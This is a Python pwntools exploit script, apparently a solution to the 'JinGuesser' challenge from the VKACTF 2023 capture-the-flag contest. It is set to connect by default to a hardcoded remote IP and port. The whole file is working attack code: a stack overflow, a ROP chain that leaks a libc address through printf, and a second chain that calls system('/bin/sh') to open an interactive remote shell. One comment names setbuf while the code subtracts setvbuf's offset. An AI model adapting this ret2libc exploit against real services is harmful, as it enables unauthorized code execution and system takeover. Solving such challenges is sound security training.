#!/usr/bin/env python3

#===========================================================
#                      VKACTF 2023
#===========================================================

from pwn import *

exe = context.binary = ELF('./JinGuesser.elf')

host = args.HOST or '212.193.61.73'
port = int(args.PORT or 11111)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

START_ADDR = 0x401160
POP_RDI = 0x40199b
POP_RSI_R15 = 0x401999
FORMAT_ADDR = 0x402640         # "...%s..."
PRINTF_ADDR = 0x401080

io = start()

#########################################################
#################### PREPARE FOR ROP ####################
#########################################################
io.recvuntil(b'Enter choice: ')
io.sendline(b'2')
io.recvuntil(b'Enter word: ')
payload_for_attempts = b'asdjflaskdjf;alkssdfjkl;asjkdlf;jaskldfj'
io.sendline(payload_for_attempts)
for _ in range(5): io. recvuntil(b'Enter choice: ')
io.sendline(b'2')
io.recvuntil(b'Enter word: ')
io.sendline(payload_for_attempts)

######################################################
#################### LEAK VIA ROP ####################
######################################################
io.recvuntil(b'Enter choice: ')
io.sendline(b'2')
io.recvuntil(b'Enter word: ')
payload_for_leak = b'as~jkaj~lkajkl~fjlkajlk~sjfkljkl~as~jkaj~lkajkl~fjlkajlk~sjfkljk'
payload_for_leak += p64(POP_RDI)
payload_for_leak += p64(FORMAT_ADDR)
payload_for_leak += p64(POP_RSI_R15)
payload_for_leak += p64(0x404080)        # got.plt (setbuf)
payload_for_leak += p64(0xdeadface)
payload_for_leak += p64(PRINTF_ADDR)
payload_for_leak += p64(START_ADDR)
io.sendline(payload_for_leak)
resp = io.recvuntil(b'"!!!').split(b'"')[1]     #b'\x7f\xff\xf7..'

SETBUF_ADDR = u64(resp + b'\x00'*(8-len(resp)))
# libc = ELF("libc.so.6")   # local
libc = ELF("libc6_2.35-0ubuntu3_amd64.so")
LIBC_BASE = SETBUF_ADDR - libc.sym["setvbuf"]
gadgets = ROP(libc)
BINSH = LIBC_BASE + next(libc.search(b'/bin/sh\x00'))
SYSTEM_ADDR = LIBC_BASE + libc.sym["system"]
POP_RDI = LIBC_BASE + (gadgets.find_gadget(['pop rdi', 'ret']))[0]

#########################################################
#################### PREPARE FOR ROP ####################
#########################################################
io.recvuntil(b'Enter choice: ')
io.sendline(b'2')
io.recvuntil(b'Enter word: ')
payload_for_attempts = b'asdjflaskdjf;alkssdfjkl;asjkdlf;jaskldfj'
io.sendline(payload_for_attempts)
for _ in range(5): io.recvuntil(b'Enter choice: ')
io.sendline(b'2')
io.recvuntil(b'Enter word: ')
io.sendline(payload_for_attempts)

#######################################################
################## SHELL VIA SYSTEM ###################
#######################################################
io.recvuntil(b'Enter choice: ')
io.sendline(b'2')
io.recvuntil(b'Enter word: ')
payload_for_shell= b'as~jkaj~lkajkl~fjlkajlk~sjfkljkl~as~jkaj~lkajkl~fjlkajlk~sjfkljk'
payload_for_shell += p64(POP_RDI)
payload_for_shell += p64(BINSH)
payload_for_shell += p64(POP_RSI_R15)
payload_for_shell += p64(0x0)
payload_for_shell += p64(0x0)
payload_for_shell += p64(SYSTEM_ADDR)
io.sendline(payload_for_shell)

io.interactive()